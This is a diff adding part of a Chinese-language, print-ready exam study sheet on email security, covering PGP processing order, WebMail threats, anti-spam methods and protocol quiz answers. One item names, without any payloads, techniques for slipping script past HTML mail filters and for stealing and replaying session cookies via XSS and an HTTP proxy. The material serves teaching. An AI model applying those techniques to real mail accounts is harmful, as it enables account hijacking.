+<li><b>暴力破解</b> → 防：<b>禁用账户</b>（可被利用成 DoS）／<b>禁止 IP</b>（误伤共用 IP、代理可绕）／<b>登录检验</b>（验证码<b>要放图片里且文件名随机</b>）。最终靠<b>密码策略</b></li>
+<li><b>恶意 HTML 邮件</b> → 改密码表单欺骗（防：<b>要求输入旧密码</b>）；恶性脚本；<b>绕过过滤 4 法</b>：事件属性 / URI scheme 设 javascript / <b>SGML 字符引用转十六进制</b>（<b>元素和属性不可用字符引用</b>）/ 样式表 @import；<b>引入外部页 3 法</b>：refresh / iframe / scriptlet。<b class="mark">POP3 服务器上不过滤</b></li>
+<li><b>Cookie 会话攻击</b> → 获取靠<b>内网监听 + XSS</b>；<b>持久型 Cookie 复制文件即可用</b>，临时 Cookie 要靠 <b>Achilles</b>（HTTP 代理）。防：<b>系统避免持久型 Cookie</b>；用户设 Cookie 安全级别 / Cookie 管理工具 / 打补丁</li>
+</ol>
+<p class="small" style="margin:.1em 0">→ 简答 6</p>
+</div>
+
+<div class="cheat">
+<h4>⑨ 反垃圾邮件三分法</h4>
+<table class="tight" style="margin:.2em 0">
+<thead><tr><th style="width:24%">类别</th><th style="width:20%">看什么</th><th>含哪些方法</th></tr></thead>
+<tbody>
+<tr><td><b>基于地址</b></td><td>谁发的</td><td>黑白名单检测、<b>反向域名验证</b></td></tr>
+<tr><td><b>基于内容</b></td><td>写了什么</td><td>分布式协作法、规则过滤法、统计过滤法、关键字过滤法</td></tr>
+<tr><td><b>基于行为</b></td><td>怎么发的</td><td>邮件通信拓扑相似性、邮件用户社交关系、SMTP 连接行为</td></tr>
+</tbody>
+</table>
+<p class="small" style="margin:.1em 0"><b>基于行为四大优点</b>：不必完整接收/不必看内容 · 与内容无关免去烦琐计算 · 减轻网络资源占用提高速度 · <b>不打开内容避免侵犯隐私</b><br>
+<b>反向域名验证难推广</b>的原因：<b>大部分 DNS 未开放反向解析权限，误判率高</b><br>→ 单选 9 = D；简答 7</p>
+</div>
+
+<div class="cheat">
+<h4>⑩ 垃圾邮件 7 大特征</h4>
+<p class="small" style="margin:.1em 0"><b>内容的重复性 · 信息的合法性 · 时间的有效性 · 地址的有效性 · 邮箱名的有效性 · HTML 的合法性 · 收件人数量大</b>；行为上是<b>大批量、时间短、发送源变换</b></p>
+<h4 style="margin-top:.5em">五类安全问题</h4>
+<p class="small" style="margin:.1em 0"><b>邮件内容被窃听 · 垃圾邮件 · 邮件炸弹 · 传播恶意代码（钓鱼）· 电子邮件欺骗</b></p>
+</div>
+
+<div class="cheat">
+<h4>⑪ 协议选择题速判</h4>
+<ul style="margin:.25em 0">
+<li>客户端操作要<b>同步到服务器</b> → <b>IMAP</b>（POP3 是脱机）→ 单选 1 = C</li>
+<li>抓包<b>能看到口令</b> → 走的是 <b>HTTP</b>；<b>看不到</b> → <b>HTTPS</b> → 单选 13 = A</li>
+<li><b>不用公钥分发会话密钥</b> 的是 <b>Needham-Schroeder</b>（靠 KDC + 对称主密钥）→ 单选 14 = B</li>
+<li>会话密钥安全交换 = <b>数字信封</b> → 单选 5 = A</li>
+<li>PGP <b>不</b>用来加密会话（正文）的算法 = <b>RSA</b> → 单选 10 = C</li>
+</ul>
+</div>
+
+<div class="cheat">
+<h4>⑫ 三道 PPT 讨论题（老师点过题）</h4>
+<ul style="margin:.25em 0">
+<li><b>顺序</b>：先签名→再压缩→最后加密（理由各两条，见①）</li>
+<li><b>Base64</b>：密文是二进制，<b>很多系统只收 ASCII</b>；代价<b>膨胀 33%</b>，<b>但加密前已压缩，实际下降小很多</b></li>
+<li><b>分段</b>：邮件系统限最大报文长（约 50 000 字节）；<b class="mark">分段在所有处理（含 Base64）之后才做，所以会话密钥部分和签名部分只在第 1 个报文段的开始位置出现一次</b>；接收端须<b>剥掉所有邮件首部</b>才能重装</li>
+</ul>
+</div>
+
+</div>
+
+<div class="box key" style="margin-top:.9em">
+  <div class="box-t">最后：如果只剩五分钟，就看这五句</div>
+  <ol style="margin:.2em 0">
+  <li>邮件不安全的<b>根子</b>是：SMTP/POP3/IMAP <b>明文传输、明文存储、发信不认证</b>。</li>
+  <li>PGP 的顺序是<b>先签名、再压缩、最后加密</b>，然后 Base64，<b>最后</b>才分段。</li>
+  <li>PGP 里<b>公钥运算只有两处</b>：<b>私钥签散列值</b>、<b>对方公钥加密会话密钥（数字信封）</b>；正文一律对称加密。</li>
+  <li>PGP 的信任模型是<b>以用户为中心的信任网</b>，只有<b>拥有者可信性由用户手工指定</b>，合法性靠<b>加权和 ≥ 1</b>。</li>
+  <li>WebMail 三威胁：<b>暴力破解 / 恶意 HTML 邮件 / Cookie 会话攻击</b>；反垃圾三分法：<b>地址 / 内容 / 行为</b>。</li>
+  </ol>
+</div>
+<hr>
+<p class="small" style="text-align:center">
+第十章 电子邮件安全 · 开卷打印版　|　PPT 41 页（<span class="pref">PPT p.N</span> 徽标）＋ 课本第 2 版 pp.306–329（<span class="bref">课本 p.N</span> 徽标）整合<br>
+本页专为 A4 打印设计：无折叠、无脚本，屏幕所见即打印所得。示例域名一律用虚构的 <code>*.example</code>。
+</p>
+</div>
+</body>
+</html>
